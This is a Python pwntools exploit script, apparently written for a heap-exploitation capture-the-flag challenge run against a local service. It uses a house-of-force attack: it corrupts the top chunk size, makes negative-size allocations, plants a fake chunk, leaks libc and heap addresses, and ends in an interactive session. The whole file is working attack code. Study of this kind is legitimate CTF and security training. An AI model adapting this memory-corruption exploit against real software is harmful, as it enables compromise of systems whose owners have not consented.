from pwn import *
context.arch = 'amd64'

#r = remote('csie.ctf.tw',10138)
r = remote('localhost',8888)
#r.interactive()
def allocate(size,data):
    r.sendline('1')
    r.recvuntil('Size :')
    r.send(str(size))
    r.recvuntil('Data :')
    r.send(data)
def show():
    r.sendline('2')
    r.recvuntil(':')
#default page size = 0x21000
heap = 0x602050             #the addr of heap variable   

#leak the first memory size, then fill it to get the tail of top chunk
def get_topchunk_info():
    allocate(0x18,'a' * 0x18)
    show()
    r.recvuntil('a' * 0x18)
    topchunk_bin = r.recvline().strip().ljust(8,'\0')
    topchunk_size = u64(topchunk_bin) + 0x20 - 1
    print('page size :' , hex(topchunk_size) )
    return topchunk_size

topchunk_size = get_topchunk_info()
def fake_top_header():
    prev_size = 0
    size = 0xdeafbeef #0x140
    fd = heap - 0x18
    bk = heap - 0x10
    fake_chunk = flat([prev_size, size, fd, bk])

    return fake_chunk
#house of force, shift down the top chunk

#overflow top chunk with size 0xffffff

    
allocate(0x1000 - 0x30,fake_top_header() )
allocate(0x18,'x'*0x18 + p64(0xffffffffffffffff))
#nb = new_top - old_top - 16 = -0x100
#move top chunk to begining of heap
allocate(-0x1030,p64(0xdeadbeef) )
allocate(0x18,'b' * 0x10 + p64(0) + p64(0x1001-0x20) )

#now the heap has a chunk in unsorted bin, leak the info about libc.so.6
allocate(0x2710,p64(0xdeadbeef) )
allocate(0xf90,'a' * 8 )

#leak info
show()
r.recvuntil('a'*8)
unsorted_bin = u64( r.recvline().strip().ljust(8,'\0') )
print('unsorted bin addr : ', hex(unsorted_bin))

#offset = 0x1188
b = unsorted_bin - 0x1188
print(hex(b-0x3c4000),hex(b-0x204000),hex(b-0x4000),hex(b))
#free another chunk to leak heap info
allocate(0x68,'x'*0x68 + p64(0xffffffffffffffff))
nb = -0x23750
#back to begining of heap
allocate(nb,'x'*8)#malloc a large bin size chunk, the unsoted bin chunk has been move to small bin
allocate(0x28,'b' * 0x20 + p64(0) + p64(0x1001-0x80) )

#back again
allocate(0x2710,p64(0xdeadbeef) )
allocate(0xf30,'a' * 8 )
allocate(0x38,'b' * 0x30 + p64(0) + p64(0xffffffffffffffff) )
nb = -0x46770
allocate(nb,'x'*8)#malloc a large bin size chunk, the unsoted bin chunk has been move to small bin

#leak the heap info
allocate(0x90,'y' * 0x90 )
show()
r.recvuntil('y'*0x90)
heap_info = u64( r.recvline().strip().ljust(8,'\0') )
heap_base = heap_info - 0x80
print('heap base : ',hex(heap_base) )




'''
allocate(0x38,'b' * 0x30 + p64(0) )
#fake chunk
allocate(0x20d00,'b' * 0x38)
allocate(0x200,'a' * 0xa0)
#f1 = flat([0x00,0xf1,heap - 0x18,heap-0x10]) + 'x'*0xd0 + flat([0xf0,0xf1])
#allocate(0xf8,f1)
#allocate(heap,'a')
'''
r.interactive()
